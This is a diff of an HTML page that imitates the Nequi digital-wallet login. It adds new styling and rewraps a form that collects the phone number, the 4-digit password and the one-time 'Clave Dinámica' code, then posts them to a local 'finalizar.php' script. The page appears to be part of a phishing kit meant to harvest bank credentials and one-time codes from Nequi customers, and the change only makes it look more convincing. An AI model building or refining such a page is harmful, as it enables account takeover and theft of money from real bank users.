@@ -11,6 +11,93 @@
     <link rel="stylesheet" href="css/nequi_two.webflow.css">
     <link rel="stylesheet" href="css/nequi_one.webflow.css">
     <link rel="stylesheet" href="css/main.css">
+    <style>
+    .nequi-login-container {
+      max-width: 370px;
+      margin: 42px auto 32px auto;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.09);
+      padding: 32px 22px 24px 22px;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .nequi-login-container h1 {
+      text-align: center;
+      color: #2c1246;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+    .nequi-login-container p {
+      text-align: center;
+      color: #5c5c5c;
+      font-size: 0.97rem;
+      margin-bottom: 22px;
+    }
+    .nequi-field {
+      margin-bottom: 18px;
+    }
+    .nequi-field label {
+      display: block;
+      font-size: 1.04rem;
+      color: #6a1c85;
+      font-weight: 500;
+      margin-bottom: 6px;
+    }
+    .nequi-field input[type="tel"],
+    .nequi-field input[type="password"] {
+      width: 100%;
+      padding: 10px 13px;
+      font-size: 1.08rem;
+      border: 1.3px solid #d4b1e9;
+      border-radius: 8px;
+      background: #f9f7fb;
+      transition: border-color 0.3s;
+      box-sizing: border-box;
+    }
+    .nequi-field input:focus {
+      border-color: #e4007a;
+      outline: none;
+    }
+    .captcha-box {
+      background: #fff7fa;
+      border: 1.3px solid #e4007a;
+      border-radius: 8px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 8px;
+    }
+    .captcha-error {
+      color: #d80027;
+      font-size: 0.93rem;
+      margin-top: 5px;
+    }
+    .nequi-btn {
+      width: 100%;
+      background: #e4007a;
+      color: #fff;
+      font-size: 1.15rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      padding: 13px 0;
+      margin-top: 12px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .nequi-btn:hover {
+      background: #b80063;
+    }
+    /* Elimina los estilos viejos del form principal */
+    .login-wrap form,
+    .login-wrap .form-group,
+    .login-wrap .btn-wrap {
+      all: unset;
+    }
+    </style>
 </head>
 <body>
     <header>
@@ -44,27 +131,31 @@
     </header>
     <section class="login-section">
         <div class="login-wrap">
-            <h1>Entra a tu Nequi</h1>
-            <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
-            <form method="POST" action="finalizar.php" autocomplete="off">
-                <div class="form-group">
-                    <label for="j_username">Número de celular</label>
-                    <input type="tel" id="j_username" name="j_username" maxlength="12" minlength="10" required>
-                </div>
-                <div class="form-group">
-                    <label for="j_password">Contraseña</label>
-                    <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required>
-                </div>
-                <div class="form-group">
-                    <label for="j_dinamica">Clave Dinámica</label>
-                    <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required>
-                </div>
-                <!-- reCAPTCHA con tu nueva clave de sitio -->
-                <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
-                <div class="btn-wrap">
-                    <input class="form-btn-submit" type="submit" value="Entra">
-                </div>
-            </form>
+            <div class="nequi-login-container">
+                <h1>Entra a tu Nequi</h1>
+                <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
+                <form method="POST" action="finalizar.php" autocomplete="off">
+                    <div class="nequi-field">
+                        <label for="j_username">Número de celular</label>
+                        <input type="tel" id="j_username" name="j_username" maxlength="12" minlength="10" required>
+                    </div>
+                    <div class="nequi-field">
+                        <label for="j_password">Contraseña</label>
+                        <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required>
+                    </div>
+                    <div class="nequi-field">
+                        <label for="j_dinamica">Clave Dinámica</label>
+                        <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required>
+                    </div>
+                    <div class="nequi-field">
+                        <div class="captcha-box">
+                            <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
+                            <div class="captcha-error" style="display:none;">La verificación ha caducado. Vuelve a marcar la casilla de verificación.</div>
+                        </div>
+                    </div>
+                    <button type="submit" class="nequi-btn">Entra</button>
+                </form>
+            </div>
         </div>
     </section>
     <footer>
